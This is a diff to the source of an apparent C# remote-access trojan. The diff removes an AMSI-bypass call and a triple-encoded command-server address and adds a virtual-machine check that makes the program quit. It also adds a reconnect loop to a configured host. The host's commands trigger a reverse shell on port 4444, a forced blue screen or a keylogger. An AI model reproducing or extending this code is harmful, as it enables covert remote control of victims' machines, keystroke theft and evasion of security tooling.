@@ -1,41 +1,62 @@
-﻿
-using mw.ampatch;
-using System.IO;
-
 using System.Net.Sockets;
-using System.Runtime.InteropServices;
 using mw.funcs;
 using mw.utils;
+using mw.settings;
 namespace mw
 {
     class mainProgram
     {
         static void Main(string[] args)
-        {
-            //amsi bypass
-            patch.chaching();
-            
-            //Get-WmiObject -Query "Select * from Win32_CacheMemory" to check for vm
+        {   
 
-            //create a stream to ip:80
-            string ip = base64.decode(base64.decode(base64.decode("ip base 64 encoded 3 times")));
-            int port = 80;
+            if(Settings.quit_on_vm) {
+                if (mal_funcs.isVM()) {
+                    return;
+                }
+            }
+
+
+            
+
+            
+
+
+
+
+
+
+
+
+
+            
+            
+
             while(true) {
+
                 try{
-                    Console.WriteLine("Connecting to " + ip + ":" + port);
-                    connecttohost(ip, port);
+
+                    Console.WriteLine("Connecting to " + Settings.ip + ":" + Settings.port);
+                    connecttohost(Settings.ip, Settings.port); 
+
                 } catch (Exception e) {
+
                     //check if e is a socket exception
                     if (e.GetType() == typeof(SocketException)) {
+
                         //host is down. wait 60 seconds and try to connect again
                         Console.WriteLine("Host is down. Waiting 60 seconds and trying to connect again.");
                         System.Threading.Thread.Sleep(60000);
+
                     }
                     else {
+
                         Console.WriteLine(e.Message);
                         break;
+
                     }
+
                 }
+
             }
 
 
@@ -44,7 +65,13 @@ namespace mw
 
 
         }
-        //move to server side software
+
+
+
+
+
+
+        //replace with better implementation
         static void connecttohost(string ip, int port) {
             //create a stream to
             using (TcpClient client = new TcpClient(ip, port)) {
@@ -70,13 +97,13 @@ namespace mw
                                         return;
                                     case "revSh":
                                         writer.WriteLine("creating revSh to port 4444");
-                                        functions.revSh();
+                                        mal_funcs.revSh();
                                         break;
                                     case "bsod":
-                                        functions.bsod();
+                                        mal_funcs.bsod();
                                         break;
                                     case "keylogger":
-                                        functions.keylogger();
+                                        mal_funcs.keylogger();
                                         break;
                                 }
                             }
